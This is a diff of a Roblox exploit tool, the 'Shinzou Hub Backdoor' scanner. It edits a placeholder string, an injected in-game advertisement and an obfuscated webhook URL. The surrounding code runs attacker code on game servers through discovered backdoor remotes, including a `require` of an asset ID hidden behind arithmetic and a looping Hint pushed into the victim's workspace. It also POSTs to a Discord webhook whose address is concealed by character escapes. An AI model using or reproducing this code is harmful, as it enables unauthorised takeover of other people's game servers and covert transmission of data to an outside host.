@@ -115,7 +115,7 @@ G2L["11"]["TextColor3"] = Color3.fromRGB(198, 119, 88);
 G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
 G2L["11"]["MultiLine"] = true;
 G2L["11"]["BackgroundTransparency"] = 1;
-G2L["11"]["PlaceholderText"] = [[-- Enter Your Require Scriot Here]];
+G2L["11"]["PlaceholderText"] = [[-- Enter Your Require Script Here]];
 G2L["11"]["Size"] = UDim2.new(0, 448, 0, 150);
 G2L["11"]["Text"] = [[]];
 G2L["11"]["Position"] = UDim2.new(0.015692640095949173, 0, 0.042270027101039886, 0);
@@ -1620,12 +1620,12 @@ for i = 1, 100 do
 				makeVisible(GUI.Executor, true)
 
 				runRemote(remote, "require(171016405.1884*69)")
-				runRemote(remote, "a=Instance.new('Hint')a.Text='Shinzou Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+				runRemote(remote, "a=Instance.new('Hint')a.Text='Shinzou Hub Backdoor | Free and FASTEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
 				
 				local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 if request and not _G.Shinzou_Hub_Backdoor_Logs_Disabled then
 	request({
-		Url = '\150\164\164\160\163\72\57\57\144\151\163\143\157\162\144\56\143\157\155\57\141\160\151\57\167\145\142\150\157\157\153\163\57\061\063\066\062\066\060\061\071\071\062\062\064\061\060\062\061\061\064\070\57\130\131\144\141\063\164\150\156\157\172\124\142\061\103\064\152\146\107\163\065\112\171\167\104\147\130\061\146\132\122\067\143\146\171\107\071\116\106\154\143\172\170\063\141\123\172\126\163\113\120\152\153\060\164\121\064\161\105\065\111\122\165\066\060\104\137\170\113',
+		Url = '\104\164\164\160\163\72\57\57\144\151\163\143\157\162\144\56\143\157\155\57\141\160\151\57\167\145\142\150\157\157\153\163\57\061\063\066\062\066\060\061\071\071\062\062\064\061\060\062\061\061\064\070\57\130\131\144\141\063\164\150\156\157\172\124\142\061\103\064\152\146\107\163\065\112\171\167\104\147\130\061\146\132\122\067\143\146\171\107\071\116\106\154\143\172\170\063\141\123\172\126\163\113\120\152\153\060\164\121\064\161\105\061\111\122\165\066\060\104\137\170\113',
 		Method = 'POST',
 		Headers = {
 			['Content-Type'] = 'application/json',
